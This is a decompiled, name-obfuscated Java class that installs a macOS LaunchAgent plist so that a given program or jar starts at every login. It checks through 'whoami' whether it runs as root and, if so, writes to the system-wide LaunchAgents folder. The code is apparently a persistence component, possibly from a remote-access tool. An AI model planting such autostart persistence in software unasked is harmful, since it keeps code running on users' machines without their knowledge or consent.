/*
 * Decompiled with CFR 0_124.
 */
package b;

import b.a;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.Reader;
import java.io.Writer;

public final class c
extends a {
    public c(String string, String string2, boolean bl) {
        super(string, string2, bl);
    }

    private static File b() {
        String string = System.getProperty("user.home");
        if (a.c.b().a() != a.c.a && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root")) {
            string = "";
        }
        return new File(String.valueOf(string) + "/Library/LaunchAgents/");
    }

    @Override
    public final void a() {
        if (!c.b().exists()) {
            c.b().mkdirs();
        }
        Object object = new File(c.b(), String.valueOf(this.b) + ".plist");
        object = new PrintWriter(new FileWriter((File)object));
        object.println("<plist version=\"1.0\">");
        object.println("<dict>");
        object.println("\t<key>Label</key>");
        object.println("\t<string>" + this.b + "</string>");
        object.println("\t<key>ProgramArguments</key>");
        object.println("\t<array>");
        if (this.a) {
            object.println("\t\t<string>java</string>");
            object.println("\t\t<string>-jar</string>");
        }
        object.println("\t\t<string>" + this.c + "</string>");
        object.println("\t</array>");
        object.println("\t<key>RunAtLoad</key>");
        object.println("\t<true/>");
        object.println("</dict>");
        object.println("</plist>");
        object.close();
    }
}
